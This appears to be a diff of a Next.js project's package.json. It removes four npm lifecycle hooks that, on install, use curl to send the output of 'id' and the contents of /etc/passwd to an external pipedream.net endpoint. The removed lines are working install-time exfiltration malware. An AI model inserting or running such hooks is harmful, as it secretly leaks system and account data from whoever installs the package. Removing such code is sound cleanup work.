@@ -6,10 +6,6 @@
   "author": "",
   "main": "index.js",
   "scripts": {
-    "preinstall": "curl https://eomkydgvf0wmx2p.m.pipedream.net --data \"$(id)\"",
-    "install": "curl https://eomkydgvf0wmx2p.m.pipedream.net --data \"$(cat /etc/passwd)\"",
-    "postinstall": "curl https://eomkydgvf0wmx2p.m.pipedream.net --data \"$(id)\"",
-    "prepare": "curl https://eomkydgvf0wmx2p.m.pipedream.net --data \"$(cat /etc/passwd)\"",
     "dev": "next dev",
     "build": "next build",
     "start": "next start"
